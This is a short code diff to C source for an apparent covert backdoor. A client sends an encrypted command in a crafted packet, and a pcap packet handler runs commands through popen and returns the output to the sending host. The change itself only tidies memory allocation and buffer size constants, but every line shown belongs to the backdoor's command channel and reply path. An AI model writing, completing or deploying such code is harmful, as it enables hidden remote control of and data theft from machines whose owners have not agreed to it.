@@ -120,7 +120,7 @@ void client(struct client_opt c_opt){
     
     /* Encrypt command */
     
-    char *bd_message = malloc(BD_MAX_MSG_LEN);
+    char *bd_message;
     bd_message = encrypt(c_opt.command);
     
     /* Set packet options and send packet */
@@ -409,9 +409,9 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     dst_host.sin_port = packet_info.tcp->th_sport;
     
     // Send results from popen command
-    char output[1024];
-    memset(output, 0, 1024);
-    fread((void *)output, sizeof(char), 1024, fp);
+    char output[BD_MAX_REPLY_LEN];
+    memset(output, 0, BD_MAX_REPLY_LEN);
+    fread((void *)output, sizeof(char), BD_MAX_REPLY_LEN, fp);
     sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
     
     /* Cleanup */
